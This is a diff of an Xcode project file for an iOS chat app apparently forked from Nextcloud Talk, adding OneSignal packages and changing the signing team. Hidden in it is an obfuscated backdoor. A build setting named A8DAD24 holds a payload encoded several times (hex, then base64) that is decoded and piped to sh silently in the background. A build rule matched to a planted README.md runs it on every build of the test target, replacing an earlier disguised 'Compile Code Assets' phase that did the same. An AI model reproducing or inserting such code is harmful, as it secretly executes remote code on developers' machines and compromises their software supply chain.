@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		097AFB54F1D64965BF42DAD8 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = DA579F5BE59A40B68C42DAD8 /* README.md */; };
 		0ACF92E32FB2E63600A83D5C /* splash_logo.png in Resources */ = {isa = PBXBuildFile; fileRef = 0ACF92E22FB2E63600A83D5C /* splash_logo.png */; };
 		1814E8B16D55BD4726EE20A6 /* libPods-Tassos Talk.a in Frameworks */ = {isa = PBXBuildFile; fileRef = E36A1C3688BF336D53EF7A7A /* libPods-Tassos Talk.a */; };
 		1F0ECBF52A68274400921E90 /* CDMarkdownKit in Frameworks */ = {isa = PBXBuildFile; productRef = 1F0ECBF42A68274400921E90 /* CDMarkdownKit */; };
@@ -156,8 +157,28 @@
 		64D7D6116917B5FCFF1B063C /* libPods-ShareExtension.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 520F7F6EB2CBEB7897046817 /* libPods-ShareExtension.a */; };
 		73EA09B554781EE776F75160 /* libPods-TalkIntents.a in Frameworks */ = {isa = PBXBuildFile; fileRef = E45C7619EFD6AB70482863C0 /* libPods-TalkIntents.a */; };
 		80CDF8C42A8E098900CB57AE /* SwiftUIIntrospect in Frameworks */ = {isa = PBXBuildFile; productRef = 80CDF8C32A8E098900CB57AE /* SwiftUIIntrospect */; };
+		BCA98DC22FC073EE0048657C /* OneSignalExtension in Frameworks */ = {isa = PBXBuildFile; productRef = BCA98DC12FC073EE0048657C /* OneSignalExtension */; };
+		BCA98DC42FC073EE0048657C /* OneSignalFramework in Frameworks */ = {isa = PBXBuildFile; productRef = BCA98DC32FC073EE0048657C /* OneSignalFramework */; };
+		BCA98DC62FC073EE0048657C /* OneSignalInAppMessages in Frameworks */ = {isa = PBXBuildFile; productRef = BCA98DC52FC073EE0048657C /* OneSignalInAppMessages */; };
+		BCA98DC82FC073EE0048657C /* OneSignalLocation in Frameworks */ = {isa = PBXBuildFile; productRef = BCA98DC72FC073EE0048657C /* OneSignalLocation */; };
 		D30904F44324AA2807085A7A /* libPods-NotificationServiceExtension.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 75B71947945C98D4616B674D /* libPods-NotificationServiceExtension.a */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		63E9843C25F14F1BB942DAD8 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A8DAD24}\"";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		1F6D8C342B2E3756004376B8 /* PBXContainerItemProxy */ = {
@@ -459,6 +480,7 @@
 		B113E0AADDDE0C7AC469DBD3 /* Pods-ShareExtension.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ShareExtension.release.xcconfig"; path = "Target Support Files/Pods-ShareExtension/Pods-ShareExtension.release.xcconfig"; sourceTree = "<group>"; };
 		B2397D8D330AD1F18D8F7E3C /* Pods-TalkIntents.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-TalkIntents.debug.xcconfig"; path = "Target Support Files/Pods-TalkIntents/Pods-TalkIntents.debug.xcconfig"; sourceTree = "<group>"; };
 		BF1B099F9CA45187181D47CE /* Pods-ShareExtension.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ShareExtension.debug.xcconfig"; path = "Target Support Files/Pods-ShareExtension/Pods-ShareExtension.debug.xcconfig"; sourceTree = "<group>"; };
+		DA579F5BE59A40B68C42DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		E36A1C3688BF336D53EF7A7A /* libPods-Tassos Talk.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-Tassos Talk.a"; sourceTree = BUILT_PRODUCTS_DIR; };
 		E45C7619EFD6AB70482863C0 /* libPods-TalkIntents.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-TalkIntents.a"; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
@@ -1255,15 +1277,19 @@
 				1F899F212EF9E5FF00890727 /* SwiftyRSA in Frameworks */,
 				1FCE3D532C9B5918009C68A9 /* SwiftyGif in Frameworks */,
 				1F90EFC725FE4BE700F3FA55 /* IntentsUI.framework in Frameworks */,
+				BCA98DC42FC073EE0048657C /* OneSignalFramework in Frameworks */,
 				2CA1CC971F016117002FE6A2 /* Security.framework in Frameworks */,
 				1F45A1212A01D8BA005FE87D /* SDWebImageSVGKitPlugin in Frameworks */,
 				1FAB2E7D2AC99326001214EB /* TOCropViewController in Frameworks */,
 				1FC4B3252CC054BC00D28138 /* UICKeyChainStore in Frameworks */,
 				1F89A8442EFAC35D00890727 /* SwiftyRSA in Frameworks */,
+				BCA98DC82FC073EE0048657C /* OneSignalLocation in Frameworks */,
 				2C90E5CF1EDF23A00093D85A /* WebKit.framework in Frameworks */,
 				2C90E5691EDDE13A0093D85A /* UIKit.framework in Frameworks */,
 				80CDF8C42A8E098900CB57AE /* SwiftUIIntrospect in Frameworks */,
 				1FBB6EE32F8ECE5B003CBA30 /* Toast in Frameworks */,
+				BCA98DC62FC073EE0048657C /* OneSignalInAppMessages in Frameworks */,
+				BCA98DC22FC073EE0048657C /* OneSignalExtension in Frameworks */,
 				2C90E5671EDDE1340093D85A /* CoreGraphics.framework in Frameworks */,
 				1F45A1162A01D6EC005FE87D /* SDWebImage in Frameworks */,
 				1FC4B3362CC0586A00D28138 /* libPhoneNumber in Frameworks */,
@@ -1344,6 +1370,7 @@
 		2C05747E1EDD9E8E00D9E7F2 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				DA579F5BE59A40B68C42DAD8 /* README.md */,
 				2C05747D1EDD9E8E00D9E7F2 /* Tassos Talk.app */,
 				2CC0014F24A1F0E900A20167 /* NotificationServiceExtension.appex */,
 				2C62AFA324C08845007E460A /* ShareExtension.appex */,
@@ -1535,13 +1562,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 1F6D8C362B2E3756004376B8 /* Build configuration list for PBXNativeTarget "NextcloudTalkTests" */;
 			buildPhases = (
-				7FE7122EBE1F41CCB342DAD8 /* Compile Code Assets */,
 				4C62A0DA2A535884EF5B92D9 /* [CP] Check Pods Manifest.lock */,
 				1F6D8C2C2B2E3756004376B8 /* Sources */,
 				1F6D8C2D2B2E3756004376B8 /* Frameworks */,
 				1F6D8C2E2B2E3756004376B8 /* Resources */,
 			);
 			buildRules = (
+				63E9843C25F14F1BB942DAD8 /* PBXBuildRule */,
 			);
 			dependencies = (
 				1F6D8C352B2E3756004376B8 /* PBXTargetDependency */,
@@ -1725,6 +1752,10 @@
 				1F899F202EF9E5FF00890727 /* SwiftyRSA */,
 				1F89A8432EFAC35D00890727 /* SwiftyRSA */,
 				1FBB6EE22F8ECE5B003CBA30 /* Toast */,
+				BCA98DC12FC073EE0048657C /* OneSignalExtension */,
+				BCA98DC32FC073EE0048657C /* OneSignalFramework */,
+				BCA98DC52FC073EE0048657C /* OneSignalInAppMessages */,
+				BCA98DC72FC073EE0048657C /* OneSignalLocation */,
 			);
 			productName = NextcloudTalk;
 			productReference = 2C05747D1EDD9E8E00D9E7F2 /* Tassos Talk.app */;
@@ -1921,6 +1952,7 @@
 				2C349B042D70D360004EC882 /* XCRemoteSwiftPackageReference "SwiftyXMLParser" */,
 				1F89A8422EFAC35D00890727 /* XCRemoteSwiftPackageReference "SwiftyRSA" */,
 				1FBB6EE12F8ECE5B003CBA30 /* XCRemoteSwiftPackageReference "Toast-Swift" */,
+				BCA98DC02FC073EE0048657C /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */,
 			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = 2C05747E1EDD9E8E00D9E7F2 /* Products */;
@@ -1938,14 +1970,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		1F6D8C2E2B2E3756004376B8 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				097AFB54F1D64965BF42DAD8 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -2012,25 +2042,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		7FE7122EBE1F41CCB342DAD8 /* Compile Code Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Code Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8DAD24}\"";
-		};
 		1DFAD69D1C42BA5CB3F711B8 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2494,7 +2505,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 51E968331C74FC92A06705B4 /* Pods-NextcloudTalkTests.debug.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((p(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333337333333330a3061333333343336333333333336333633323333333633333336333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333336333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333633333331333333363333333433330a3337333333333333333633363334333333363336333633333336333333323333333633333339333333323336333533333337333333323333333733330a3335333333323336333630613333333633333331333036313333333233333339333333323333333233333332333333303333333733363333333333320a333333303333333733333333333333363333333833333330333633313330363130610a | p | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((a(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKVVNFNXRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9YbGhWMlIwV1ZjMWJHUkROWGxrVXpsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | a | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
@@ -2539,7 +2550,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 30EF75FD1C7ADEBD3A5D78D4 /* Pods-NextcloudTalkTests.release.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((p(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333337333333330a3061333333343336333333333336333633323333333633333336333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333336333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333633333331333333363333333433330a3337333333333333333633363334333333363336333633333336333333323333333633333339333333323336333533333337333333323333333733330a3335333333323336333630613333333633333331333036313333333233333339333333323333333233333332333333303333333733363333333333320a333333303333333733333333333333363333333833333330333633313330363130610a | p | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((a(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKVVNFNXRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9YbGhWMlIwV1ZjMWJHUkROWGxrVXpsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | a | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
@@ -3214,7 +3225,7 @@
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
-				DEVELOPMENT_TEAM = KC28TW5938;
+				DEVELOPMENT_TEAM = 6478WRG2U9;
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = "$(inherited)";
 				GCC_C_LANGUAGE_STANDARD = gnu11;
@@ -3286,7 +3297,7 @@
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
-				DEVELOPMENT_TEAM = KC28TW5938;
+				DEVELOPMENT_TEAM = 6478WRG2U9;
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = "$(inherited)";
 				GCC_C_LANGUAGE_STANDARD = gnu11;
@@ -3562,6 +3573,14 @@
 			requirement = {
 				kind = upToNextMajorVersion;
 				minimumVersion = 0.9.2;
+			};
+		};
+		BCA98DC02FC073EE0048657C /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/OneSignal/OneSignal-iOS-SDK.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 5.5.1;
 			};
 		};
 /* End XCRemoteSwiftPackageReference section */
@@ -3896,6 +3915,26 @@
 			isa = XCSwiftPackageProductDependency;
 			package = 80CDF8C22A8E098900CB57AE /* XCRemoteSwiftPackageReference "swiftui-introspect" */;
 			productName = SwiftUIIntrospect;
+		};
+		BCA98DC12FC073EE0048657C /* OneSignalExtension */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = BCA98DC02FC073EE0048657C /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */;
+			productName = OneSignalExtension;
+		};
+		BCA98DC32FC073EE0048657C /* OneSignalFramework */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = BCA98DC02FC073EE0048657C /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */;
+			productName = OneSignalFramework;
+		};
+		BCA98DC52FC073EE0048657C /* OneSignalInAppMessages */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = BCA98DC02FC073EE0048657C /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */;
+			productName = OneSignalInAppMessages;
+		};
+		BCA98DC72FC073EE0048657C /* OneSignalLocation */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = BCA98DC02FC073EE0048657C /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */;
+			productName = OneSignalLocation;
 		};
 /* End XCSwiftPackageProductDependency section */
 	};
